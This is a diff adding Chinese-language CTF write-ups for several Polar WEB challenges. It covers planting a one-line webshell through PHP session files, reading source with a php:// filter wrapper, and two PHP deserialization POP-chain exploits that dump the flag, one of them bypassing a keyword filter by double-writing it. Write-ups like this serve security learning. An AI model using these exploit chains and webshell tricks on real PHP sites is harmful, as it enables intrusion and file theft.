@@ -310,4 +310,259 @@ if (isset($_GET['xxs'])) {
 $_SESSION['xxs'] = $sys;
 ```
 
-## 
+此处对 session 既有读又有写, 那么应该是利用这里来传马, 首先传个一句话木马:
+
+![15-1.png](15-1.png)
+
+刚刚给出了 session 的存放在 `/tmp` 中, 直接吧返回的 PHPSESSID 给带上, php session 的命名规则就是 `sess_` + PHPSESSID:
+
+![15-2.png](15-2.png)
+
+需要注意的是直接用 Webshell 的话, 网站在执行一条后就会销毁之前的上一个 session, payload:
+
+![15-3.png](15-3.png)
+
+<br>
+
+## [Polar WEB] phar
+
+### 题解
+
+开门源码:
+
+```php
+ <?php
+include 'funs.php';
+highlight_file(__FILE__);
+if (isset($_GET['file'])) {
+    if (myWaf($_GET['file'])) {
+        include($_GET['file']);
+    } else {
+        unserialize($_GET['data']);
+    }
+} 
+```
+
+首先利用 include 这里的文件包含, 使用伪协议:
+
+![16-1.png](16-1.png)
+
+解码后:
+
+```php
+<?php
+include 'f1@g.php';
+function myWaf($data)
+{
+    if (preg_match("/f1@g/i", $data)) {
+        echo "NONONONON0!";
+        return FALSE;
+    } else {
+        return TRUE;
+    }
+}
+
+class A
+{
+    private $a;
+
+    public function __destruct()
+    {
+        echo "A->" . $this->a . "destruct!";
+    }
+}
+
+class B
+{
+    private $b = array();
+    public function __toString()
+    {
+        $str_array= $this->b;
+        $str2 = $str_array['kfc']->vm50;
+        return "Crazy Thursday".$str2;
+    }
+}
+class C{
+    private $c = array();
+    public function __get($kfc){
+        global $flag;
+        $f = $this->c[$kfc];
+        var_dump($$f);
+    }
+}
+```
+
+调用链:
+
+```
+A.__destruct -> B.__toString -> C.__get
+```
+
+exp, 注意属性要改成 `public`:
+
+```php
+<?php
+
+class A
+{
+    public $a;
+
+    public function __destruct()
+    {
+        echo "A->" . $this->a . "destruct!";
+    }
+}
+
+class B
+{
+    public $b = array();
+    public function __toString()
+    {
+        $str_array= $this->b;
+        $str2 = $str_array['kfc']->vm50;
+        return "Crazy Thursday".$str2;
+    }
+}
+class C{
+    public $c = array();
+    public function __get($kfc){
+        global $flag;
+        $f = $this->c[$kfc];
+        var_dump($$f);
+    }
+}
+
+
+$a1 = new A();
+$a2 = new B();
+$a3 = new C();
+$a2->b=array('kfc'=> $a3);
+$a1->a=$a2;
+$a3->c=array('vm50'=>'flag');
+
+echo serialize($a1);
+```
+
+![16-2.png](16-2.png)
+
+编码一下, 传入, 爆出 flag:
+
+![16-3.png](16-3.png)
+
+反序列化的题总的来说就是熟能生巧;
+
+## [Polar WEB] Deserialized
+
+### 题解
+
+开门源码:
+
+```php
+<?php
+
+class Polar
+{
+    public $night;
+    public $night_arg;
+
+    public function __wakeup()
+    {
+        echo "hacker";
+        $this->night->hacker($this->night_arg);
+    }
+
+}
+
+class Night
+{
+    public function __call($name, $arguments)
+    {
+        echo "wrong call:" . $name . "  arg:" . $arguments[0];
+    }
+}
+
+class Day
+{
+    public $filename="/flag";
+
+    public function __toString()
+    {
+        $this->filename = str_replace("flag", "", $this->filename);
+        echo file_get_contents($this->filename);
+        return $this->filename;
+    }
+}
+
+if (isset($_POST['polar'])) {
+    unserialize(base64_decode($_POST['polar']));
+} else {
+    highlight_file(__FILE__);
+}
+```
+
+攻击链:
+
+```
+Polar.__wakeup()->Night.__call()->Day.__toString()
+```
+
+注意这里的 flag 字符串过滤应该是可以双写绕过的, exp:
+
+```php
+<?php 
+
+class Polar
+{
+    public $night;
+    public $night_arg;
+
+    public function __wakeup()
+    {
+        echo "hacker";
+        $this->night->hacker($this->night_arg);
+    }
+
+}
+
+class Night
+{
+    public function __call($name, $arguments)
+    {
+        echo "wrong call:" . $name . "  arg:" . $arguments[0];
+    }
+}
+
+class Day
+{
+    public $filename="/flag";
+
+    public function __toString()
+    {
+        $this->filename = str_replace("flag", "", $this->filename);
+        echo file_get_contents($this->filename);
+        return $this->filename;
+    }
+}
+
+$polar = new Polar();
+$night = new Night();
+$day = new Day();
+
+$day->filename = "/flflagag";
+
+$polar->night = $night;
+$polar->night_arg = $day;
+
+echo serialize($polar);
+echo "\n";
+echo base64_encode(serialize($polar)); 
+?>
+```
+
+执行:
+
+![17-1.png](17-1.png)
+
+爆出 flag:
+
+![17-2.png](17-2.png)
